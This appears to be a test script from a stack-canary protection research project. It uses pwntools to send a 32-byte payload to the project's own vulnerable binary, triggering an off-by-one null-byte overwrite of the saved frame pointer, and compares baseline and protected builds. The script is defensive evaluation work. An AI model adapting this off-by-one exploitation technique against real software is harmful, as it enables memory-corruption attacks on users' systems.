# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp_offbyone.py
# 功能描述: Off-By-One 单字节溢出攻击验证脚本。
#
#           针对 vuln_off_by_one() 中的单字节越界写漏洞发起攻击：
#           程序在接收 32 字节输入后，会在 buf[32] 处强制写入 '\0'，
#           精确覆盖了存储在其正上方的 saved RBP 的最低位字节，导致
#           函数返回时栈指针发生偏移（栈帧迁移），进而引发崩溃或可控跳转。
#
#           预期结果：
#             - targets_baseline  : 程序崩溃，攻击触发栈帧错乱。
#             - targets_protected : 动态 Canary 在函数返回前检测到 Canary
#               已被污染（单字节覆盖会影响相邻的 Canary 槽），触发拦截。
#
# 用法: python3 exp_offbyone.py          # 测试基线版本
#        python3 exp_offbyone.py prot     # 测试动态 Canary 保护版本
#
# 依赖工具: pwntools
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *
import sys, time

is_prot = len(sys.argv) > 1 and sys.argv[1] == 'prot'
target = '../output/targets_protected' if is_prot else '../output/targets_baseline'
print(f"================ 测试目标: {target} ================")

p = process([target, '3'])

# 刚好发送 32 字节。程序会在第 33 字节（超出 buf 边界一字节）补上 '\0'。
# 在基线版本中，这会将 saved RBP 的最低位变成 00，导致返回时栈指针错乱！
payload = b'A' * 32

p.recvuntil(b": ")
p.send(payload)
time.sleep(0.5)

print(p.recvall(timeout=1).decode('utf-8', 'ignore'))